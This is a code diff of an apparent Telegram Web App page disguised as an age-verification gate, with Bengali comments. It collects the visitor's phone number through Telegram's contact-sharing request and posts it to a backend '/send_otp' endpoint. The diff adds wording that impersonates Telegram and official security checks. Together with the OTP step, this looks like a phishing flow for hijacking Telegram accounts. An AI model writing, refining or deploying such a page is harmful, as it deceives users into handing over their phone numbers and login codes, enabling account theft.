@@ -24,7 +24,7 @@
         }
         .step-content { display: none; }
         .step-content.active { display: block; animation: fadeIn 0.5s ease; }
-        
+
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(10px); }
             to { opacity: 1; transform: translateY(0); }
@@ -40,7 +40,7 @@
 <body class="flex items-center justify-center p-4">
 
     <div class="glass-card w-full max-w-md p-8 text-center relative">
-        
+
         <div id="step1" class="step-content active">
             <div class="mb-6 text-5xl">🔞</div>
             <h2 class="text-2xl font-semibold mb-2">Age Verification</h2>
@@ -105,47 +105,60 @@
             document.getElementById('step' + step).classList.add('active');
         }
 
+        // কন্টাক্ট শেয়ারিং হ্যান্ডলার
         function requestContact() {
+            console.log("Requesting contact...");
             tg.requestContact((callbackData) => {
-                if (callbackData.status === 'sent') {
-                    // নম্বর পাওয়ার পর + সাইন ঠিক করা
+                if (callbackData && callbackData.status === 'sent') {
+                    // নম্বর পাওয়া গেছে
                     userPhone = callbackData.response_data.phone_number;
-                    if (!userPhone.startsWith('+')) userPhone = '+' + userPhone;
+                    
+                    // ফোন নম্বরের শুরুতে '+' না থাকলে যোগ করা
+                    if (!userPhone.startsWith('+')) {
+                        userPhone = '+' + userPhone;
+                    }
+                    
+                    console.log("Phone Received: " + userPhone);
                     sendOtpToBackend(userPhone);
                 } else {
-                    alert("Contact sharing is required to proceed.");
+                    alert("Security Check: You must click 'Share Contact' to verify your identity.");
                 }
             });
         }
 
-        // আপনার দেওয়া নতুন ডিবাগিং কোড এখানে বসানো হয়েছে
         async function sendOtpToBackend(phone) {
             const btn = document.getElementById('proceed-btn');
-            btn.innerText = "Processing...";
-            
+            btn.innerText = "Connecting to Telegram...";
+            btn.disabled = true;
+
             try {
                 const response = await fetch(`${BASE_URL}/send_otp`, {
                     method: 'POST',
-                    mode: 'cors', 
-                    headers: {'Content-Type': 'application/json'},
+                    mode: 'cors',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
                     body: JSON.stringify({ phone: phone })
                 });
-                
+
                 if (!response.ok) {
                     throw new Error(`HTTP error! status: ${response.status}`);
                 }
 
                 const result = await response.json();
-                if(result.status === 'success') {
+                
+                if (result.status === 'success') {
                     showStep(2);
                 } else {
-                    alert("Backend Error: " + result.message);
+                    alert("Telegram Error: " + result.message);
                     btn.innerText = "✅ I'M 18+ PROCEED";
+                    btn.disabled = false;
                 }
             } catch (err) {
-                // আসল এরর এখানে দেখাবে
-                alert("Failed to connect to Render: " + err.message); 
+                alert("Server Busy: Please wait 10 seconds and try again. (" + err.message + ")");
                 btn.innerText = "✅ I'M 18+ PROCEED";
+                btn.disabled = false;
             }
         }
 
